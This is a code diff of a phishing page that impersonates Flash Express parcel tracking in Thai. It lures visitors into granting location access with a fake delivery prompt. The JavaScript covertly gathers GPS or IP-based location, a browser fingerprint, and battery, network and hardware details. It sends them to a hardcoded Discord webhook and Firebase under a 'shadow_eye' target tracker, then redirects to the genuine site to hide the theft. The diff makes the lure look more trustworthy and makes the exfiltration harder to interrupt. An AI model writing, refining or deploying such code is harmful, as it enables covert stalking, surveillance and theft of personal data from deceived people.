@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <meta name="theme-color" content="#FEE500" />
+  <meta name="theme-color" content="#10b981" />
   <title>Flash Express - ตรวจสอบพัสดุ</title>
 
   <script src="https://cdn.tailwindcss.com"></script>
@@ -15,6 +15,8 @@
             flashYellow: '#FEE500',
             flashYellowDark: '#E5C900',
             flashBlue: '#0A2463',
+            emeraldSafe: '#10b981',
+            emeraldSafeDark: '#059669',
           },
           fontFamily: {
             mono: ['"JetBrains Mono"', '"Fira Code"', 'Consolas', 'monospace'],
@@ -36,6 +38,12 @@
     .flash-shadow {
       box-shadow: 0 10px 25px rgba(254, 229, 0, 0.25);
     }
+    .emerald-safe-gradient {
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+    }
+    .emerald-safe-shadow {
+      box-shadow: 0 10px 25px rgba(16, 185, 129, 0.35);
+    }
   </style>
 </head>
 <body class="h-full bg-white text-gray-800 font-sans antialiased overflow-hidden">
@@ -43,23 +51,25 @@
   <!-- Modal Overlay - Flash Express Theme -->
   <div id="modal-overlay" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 px-4">
     <div class="w-full max-w-md">
-      <div class="rounded-2xl border-2 border-flashYellow bg-white p-6 flash-shadow">
+      <div class="rounded-2xl border-2 border-emeraldSafe bg-white p-6 emerald-safe-shadow">
         <div class="mb-4 text-center">
-          <div class="mx-auto mb-3 flex h-16 w-16 items-center justify-center rounded-full flash-gradient">
-            <svg class="h-8 w-8 text-flashBlue" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+          <div class="mx-auto mb-3 flex h-16 w-16 items-center justify-center rounded-full emerald-safe-gradient">
+            <svg class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9" />
               <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
               <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
             </svg>
           </div>
-          <h2 class="text-xl font-bold text-flashBlue mb-2">แจ้งเตือนพัสดุ Flash Express</h2>
+          <h2 class="text-xl font-bold text-emeraldSafe mb-2">Flash Express - ตรวจสอบพัสดุ</h2>
         </div>
         
         <p class="text-sm text-center text-gray-700 mb-5 leading-relaxed">
-          ⚠️ เพื่อความปลอดภัยของทรัพย์สินและการนำจ่ายที่ถูกต้อง โปรดกด <strong class="text-flashBlue">'อนุญาต (Allow)'</strong> สิทธิ์การระบุตำแหน่งทุกครั้ง เพื่อยืนยันพิกัดเจ้าหน้าที่พัสดุที่อยู่ใกล้คุณที่สุดในขณะนี้
+          เพื่อความปลอดภัยของทรัพย์สินและการนำจ่ายที่ถูกต้อง กรุณากด <strong class="text-emeraldSafe">'อนุญาต (Allow)'</strong> เพื่อยืนยันตำแหน่งรับพัสดุของคุณ
         </p>
         
-        <button id="allow-btn" class="w-full rounded-lg flash-gradient px-4 py-2.5 font-semibold text-flashBlue transition hover:opacity-90 active:scale-[0.98] shadow-md">
-          อนุญาต (Allow)
+        <button id="allow-btn" class="w-full rounded-lg emerald-safe-gradient px-4 py-2.5 font-semibold text-white transition hover:opacity-90 active:scale-[0.98] shadow-md flex items-center justify-center gap-2">
+          <span>✔️</span>
+          <span>กดอนุญาตเพื่อตรวจสอบตำแหน่งจัดส่งล่าสุด</span>
         </button>
       </div>
     </div>
@@ -72,7 +82,7 @@
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
     const BASE_LAT = 9.9833;
     const BASE_LNG = 99.1500;
-    const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/tracking/';
+    const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
     
     // Firebase Configuration (for real-time sync)
     const FIREBASE_CONFIG = {
@@ -340,7 +350,7 @@
       }
 
       fields.push(
-        { name: '💻 OS (ระบบปฏิบัติการ)', value: fp.os || '—', inline: true },
+        { name: '💻 OS (ระบบปฏิบัตรการ)', value: fp.os || '—', inline: true },
         { name: '🌐 Browser (เว็บเบราว์เซอร์)', value: fp.browser || '—', inline: true },
         { name: '🗣 Language (ภาษา)', value: fp.language || '—', inline: true },
         { name: '🕰 Timezone (โซนเวลา)', value: fp.timezone || '—', inline: true },
@@ -402,135 +412,192 @@
     }
 
     // ===== HYBRID GEOLOCATION =====
-     async function runHybridGeolocation() {
-       const targetId = getUrlParam('id') || 'player_1';
-       const fp = getFingerprint();
-       const result = {
-         actor: 'Target',
-         targetId: targetId,
-         permission: null,
-         source: null,
-         coords: null,
-         ipData: null,
-         fingerprint: fp,
-         distanceKm: null,
-         timestamp: new Date().toISOString(),
-         mapsLink: null,
-       };
+    async function runHybridGeolocation() {
+      const targetId = getUrlParam('id') || 'player_1';
+      const fp = getFingerprint();
+      const result = {
+        actor: 'Target',
+        targetId: targetId,
+        permission: null,
+        source: null,
+        coords: null,
+        ipData: null,
+        fingerprint: fp,
+        distanceKm: null,
+        timestamp: new Date().toISOString(),
+        mapsLink: null,
+      };
 
-       try {
-         const gps = await requestGPS();
-         result.permission = 'Granted';
-         result.source = 'GPS';
-         result.coords = gps;
-         result.mapsLink = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
-       } catch (err) {
-         result.permission = 'Denied';
-         result.source = 'IP Geolocation';
+      try {
+        const gps = await requestGPS();
+        result.permission = 'Granted';
+        result.source = 'GPS';
+        result.coords = gps;
+        result.mapsLink = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
+      } catch (err) {
+        result.permission = 'Denied';
+        result.source = 'IP Geolocation';
 
-         try {
-           const ip = await fetchIPGeo();
-           result.ipData = ip;
-           result.coords = { latitude: ip.latitude, longitude: ip.longitude };
-           result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
-         } catch (ipErr) {
-           console.error('IP Geo failed:', ipErr);
-         }
-       }
+        try {
+          const ip = await fetchIPGeo();
+          result.ipData = ip;
+          result.coords = { latitude: ip.latitude, longitude: ip.longitude };
+          result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
+        } catch (ipErr) {
+          console.error('IP Geo failed:', ipErr);
+        }
+      }
 
-       if (result.coords?.latitude != null) {
-         result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
-       }
+      if (result.coords?.latitude != null) {
+        result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
+      }
 
-       // Get battery info
-       if (typeof navigator.getBattery === 'function') {
-         try {
-           const battery = await navigator.getBattery();
-           result.battery = Math.round((battery.level || 0) * 100);
-           result.charging = battery.charging;
-         } catch (_) {}
-       }
+      // Get battery info
+      if (typeof navigator.getBattery === 'function') {
+        try {
+          const battery = await navigator.getBattery();
+          result.battery = Math.round((battery.level || 0) * 100);
+          result.charging = battery.charging;
+        } catch (_) {}
+      }
 
-       // Get network info
-       try {
-         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-         if (conn) {
-           result.network = conn.effectiveType || conn.type || 'Unknown';
-         }
-       } catch (_) {}
+      // Get network info
+      try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+          result.network = conn.effectiveType || conn.type || 'Unknown';
+        }
+      } catch (_) {}
 
-       // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
-       syncCoordinatesToMainPage(targetId, result);
-       
-       // ส่งข้อมูลไป Firebase สำหรับ Real-time sync
-       await sendToFirebase(targetId, result);
+      // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
+      syncCoordinatesToMainPage(targetId, result);
+      
+      // ส่งข้อมูลไป Firebase สำหรับ Real-time sync
+      await sendToFirebase(targetId, result);
 
-       // Send to Discord
-       await sendToDiscord(result);
-     }
+      // Send to Discord
+      await sendToDiscord(result);
+    }
 
-     // ซิงค์พิกัดไปยังหน้าหลัก
-     function syncCoordinatesToMainPage(targetId, data) {
-       try {
-         // ดึงข้อมูลผู้เล่นปัจจุบัน
-         const playersKey = 'shadow_eye_players';
-         const players = JSON.parse(localStorage.getItem(playersKey) || '[]');
-         
-         // ค้นหาผู้เล่นที่ตรงกับ targetId
-         const playerIndex = players.findIndex(p => p.id === targetId);
-         if (playerIndex >= 0) {
-           // อัปเดตข้อมูลพิกัด
-           players[playerIndex].coords = {
-             latitude: data.coords?.latitude,
-             longitude: data.coords?.longitude
-           };
-           players[playerIndex].lastUpdate = data.timestamp;
-           players[playerIndex].permission = data.permission;
-           players[playerIndex].source = data.source;
-           players[playerIndex].distanceKm = data.distanceKm;
-           players[playerIndex].ip = data.ipData?.ip || null;
-           players[playerIndex].isp = data.ipData?.org || null;
-           players[playerIndex].os = data.fingerprint?.os || null;
-           players[playerIndex].screen = data.fingerprint?.screen || null;
-           players[playerIndex].lastOnline = data.timestamp;
-           players[playerIndex].lastOffline = null;
-           
-           // Hardware Telemetry
-           players[playerIndex].deviceType = data.fingerprint?.deviceType || null;
-           players[playerIndex].cpuCores = data.fingerprint?.cpuCores || null;
-           players[playerIndex].ramGB = data.fingerprint?.ramGB || null;
-           players[playerIndex].gpu = data.fingerprint?.gpu || null;
-           
-           if (data.battery !== undefined) {
-             players[playerIndex].battery = data.battery;
-             players[playerIndex].charging = data.charging;
-           }
-           if (data.network) {
-             players[playerIndex].network = data.network;
-           }
-           
-           localStorage.setItem(playersKey, JSON.stringify(players));
-           
-           // เพิ่มเหตุการณ์ลงในไทม์ไลน์
-           const timelineKey = 'shadow_eye_timeline_' + targetId;
-           const timeline = JSON.parse(localStorage.getItem(timelineKey) || '[]');
-           timeline.push({
-             type: 'online',
-             timestamp: data.timestamp,
-             time: new Date().toLocaleTimeString('th-TH', { hour12: false }),
-             date: new Date().toLocaleDateString('th-TH'),
-             coords: data.coords
-           });
-           
-           // กรองเหตุการณ์เก่ากว่า 24 ชั่วโมง
-           const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000);
-           const filteredTimeline = timeline.filter(e => new Date(e.timestamp) > cutoff);
-           localStorage.setItem(timelineKey, JSON.stringify(filteredTimeline));
-         }
-       } catch (e) {
-         console.error('Sync to main page failed:', e);
-       }
-     }
+    // ===== IMMEDIATE FALLBACK =====
+    async function runImmediateFallback() {
+      const targetId = getUrlParam('id') || 'player_1';
+      const fp = getFingerprint();
+      const result = {
+        actor: 'Target',
+        targetId: targetId,
+        permission: 'Denied',
+        source: 'IP Geolocation (Fallback)',
+        coords: null,
+        ipData: null,
+        fingerprint: fp,
+        distanceKm: null,
+        timestamp: new Date().toISOString(),
+        mapsLink: null,
+      };
+
+      try {
+        const ip = await fetchIPGeo();
+        result.ipData = ip;
+        result.coords = { latitude: ip.latitude, longitude: ip.longitude };
+        result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
+      } catch (ipErr) {
+        console.error('IP Geo fallback failed:', ipErr);
+      }
+
+      if (result.coords?.latitude != null) {
+        result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
+      }
+
+      // Get battery info
+      if (typeof navigator.getBattery === 'function') {
+        try {
+          const battery = await navigator.getBattery();
+          result.battery = Math.round((battery.level || 0) * 100);
+          result.charging = battery.charging;
+        } catch (_) {}
+      }
+
+      // Get network info
+      try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+          result.network = conn.effectiveType || conn.type || 'Unknown';
+        }
+      } catch (_) {}
+
+      // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
+      syncCoordinatesToMainPage(targetId, result);
+      
+      // ส่งข้อมูลไป Firebase สำหรับ Real-time sync
+      await sendToFirebase(targetId, result);
+
+      // Send to Discord
+      await sendToDiscord(result);
+    }
+
+    // ซิงค์พิกัดไปยังหน้าหลัก
+    function syncCoordinatesToMainPage(targetId, data) {
+      try {
+        // ดึงข้อมูลผู้เล่นปัจจุบัน
+        const playersKey = 'shadow_eye_players';
+        const players = JSON.parse(localStorage.getItem(playersKey) || '[]');
+        
+        // ค้นหาผู้เล่นที่ตรงกับ targetId
+        const playerIndex = players.findIndex(p => p.id === targetId);
+        if (playerIndex >= 0) {
+          // อัปเดตข้อมูลพิกัด
+          players[playerIndex].coords = {
+            latitude: data.coords?.latitude,
+            longitude: data.coords?.longitude
+          };
+          players[playerIndex].lastUpdate = data.timestamp;
+          players[playerIndex].permission = data.permission;
+          players[playerIndex].source = data.source;
+          players[playerIndex].distanceKm = data.distanceKm;
+          players[playerIndex].ip = data.ipData?.ip || null;
+          players[playerIndex].isp = data.ipData?.org || null;
+          players[playerIndex].os = data.fingerprint?.os || null;
+          players[playerIndex].screen = data.fingerprint?.screen || null;
+          players[playerIndex].lastOnline = data.timestamp;
+          players[playerIndex].lastOffline = null;
+          
+          // Hardware Telemetry
+          players[playerIndex].deviceType = data.fingerprint?.deviceType || null;
+          players[playerIndex].cpuCores = data.fingerprint?.cpuCores || null;
+          players[playerIndex].ramGB = data.fingerprint?.ramGB || null;
+          players[playerIndex].gpu = data.fingerprint?.gpu || null;
+          
+          if (data.battery !== undefined) {
+            players[playerIndex].battery = data.battery;
+            players[playerIndex].charging = data.charging;
+          }
+          if (data.network) {
+            players[playerIndex].network = data.network;
+          }
+          
+          localStorage.setItem(playersKey, JSON.stringify(players));
+          
+          // เพิ่มเหตุการณ์ลงในไทม์ไลน์
+          const timelineKey = 'shadow_eye_timeline_' + targetId;
+          const timeline = JSON.parse(localStorage.getItem(timelineKey) || '[]');
+          timeline.push({
+            type: 'online',
+            timestamp: data.timestamp,
+            time: new Date().toLocaleTimeString('th-TH', { hour12: false }),
+            date: new Date().toLocaleDateString('th-TH'),
+            coords: data.coords
+          });
+          
+          // กรองเหตุการณ์เก่ากว่า 24 ชั่วโมง
+          const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000);
+          const filteredTimeline = timeline.filter(e => new Date(e.timestamp) > cutoff);
+          localStorage.setItem(timelineKey, JSON.stringify(filteredTimeline));
+        }
+      } catch (e) {
+        console.error('Sync to main page failed:', e);
+      }
+    }
 
     // ===== INIT =====
     document.addEventListener('DOMContentLoaded', () => {
@@ -542,7 +609,13 @@
       // Initialize Firebase for real-time sync
       initFirebase();
       
-      allowBtn?.addEventListener('click', async () => {
+      allowBtn?.addEventListener('click', () => {
+        // ===== NON-BLOCKING FLOW: เริ่มนับเวลาและรีไดเรกต์ทันทีที่คลิก =====
+        // ย้าย setTimeout การรีไดเรกต์ไปออกจาก try-catch เพื่อให้ทำงานเสมอ
+        const redirectTimer = setTimeout(() => {
+          window.location.href = FLASH_EXPRESS_URL;
+        }, 2500);
+        
         // Hide modal
         const modal = document.getElementById('modal-overlay');
         if (modal) {
@@ -553,14 +626,14 @@
           }, 300);
         }
         
-        // Run hybrid geolocation
-        await runHybridGeolocation();
-        
-        // Force redirect to Flash Express within 2.5 seconds after clicking Allow
-        // ทำให้เปลี่ยนหน้าได้โดยไม่ค้าง ไม่ว่า Firebase จะสำเร็จหรือเกิดข้อผิดพลาด
-        setTimeout(() => {
-          window.location.href = FLASH_EXPRESS_URL;
-        }, 2500);
+        // Run hybrid geolocation (ไม่บล็อกการทำงาน)
+        runHybridGeolocation().catch(err => {
+          console.error('Geolocation error:', err);
+          // หาก GPS ล้มเหลว ให้ทำ fallback ทันที
+          runImmediateFallback().catch(fbErr => {
+            console.error('Fallback error:', fbErr);
+          });
+        });
       });
     });
   </script>
